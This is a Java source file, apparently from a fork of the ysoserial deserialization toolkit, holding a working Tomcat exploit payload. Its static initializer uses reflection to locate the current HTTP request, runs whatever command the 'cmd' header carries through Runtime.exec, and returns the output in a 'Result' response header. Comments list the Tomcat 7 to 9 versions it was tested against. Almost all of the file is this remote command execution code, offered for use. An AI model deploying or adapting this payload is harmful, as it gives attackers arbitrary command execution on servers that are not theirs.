package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.apache.tomcat.util.buf.ByteChunk;

/*
tested on Tomcat:
 - 7.0.105
 - 8.0.38
 - 8.5.53
 - 9.0.37
 */


// 参考：https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Tomcat/code/TomcatEcho-%E5%85%A8%E7%89%88%E6%9C%AC.jsp
public class MyClassLoader2 extends AbstractTranslet {
    static {
        try{
//            Runtime.getRuntime().exec("calc");

            boolean flag = false;
            ThreadGroup group = Thread.currentThread().getThreadGroup();
            java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
            f.setAccessible(true);
            Thread[] threads = (Thread[]) f.get(group);
            for(int i = 0; i < threads.length; i++) {
                try{
                    Thread t = threads[i];
                    if (t == null) continue;
                    String str = t.getName();
                    if (str.contains("exec") || !str.contains("http")) continue;
                    f = t.getClass().getDeclaredField("target");
                    f.setAccessible(true);
                    Object obj = f.get(t);
                    if (!(obj instanceof Runnable)) continue;
                    f = obj.getClass().getDeclaredField("this$0");
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try{
                        f = obj.getClass().getDeclaredField("handler");
                    }catch (NoSuchFieldException e){
                        f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try{
                        f = obj.getClass().getSuperclass().getDeclaredField("global");
                    }catch(NoSuchFieldException e){
                        f = obj.getClass().getDeclaredField("global");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    f = obj.getClass().getDeclaredField("processors");
                    f.setAccessible(true);
                    java.util.List processors = (java.util.List)(f.get(obj));
                    for(int j = 0; j < processors.size(); ++j) {
                        Object processor = processors.get(j);
                        f = processor.getClass().getDeclaredField("req");
                        f.setAccessible(true);
                        Object req = f.get(processor);
                        Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
//                        str = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
//                        String str2= (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"Testecho"});

                        String cmd = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});;
//                        String[] cmds = new String[]{"cmd.exe", "/c", "ipconfig"};
//                        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
//                        String result = new String((new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                        String result = new String((new java.util.Scanner((Runtime.getRuntime().exec(cmd)).getInputStream())).useDelimiter("\\A").next().getBytes());
                        // 回显Testecho头，别500了不好看
//                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
//                           resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Testecho", str2});
                        resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Result", result});
                        flag = true;

                        if (flag) break;
                    }
                    if (flag)  break;
                }catch(Exception e){
                    continue;
                }
            }



        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

